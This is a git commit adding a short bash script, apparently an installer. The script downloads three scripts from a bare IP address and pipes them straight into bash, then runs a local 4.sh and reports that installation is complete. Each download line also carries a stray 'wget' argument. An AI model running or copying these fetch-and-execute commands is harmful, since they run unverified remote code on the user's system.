ab822323c033606fe2fa77276ac6314c3badf1b6
50801684 <42910719+50801684@users.noreply.github.com>
2022-10-15 21:20:59 +0800

    Add files via upload

---
+++ 6.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+bash -c "$(curl -sS wget http://159.75.133.49:8888/down/Bz9rylRIrziz)"
+bash -c "$(curl -sS wget http://159.75.133.49:8888/down/BJIFDVsA04MO)"
+bash -c "$(curl -sS wget http://159.75.133.49:8888/down/5kzzyFJ7HGT3)"
+
+./4.sh -d 
+echo "安装完成"
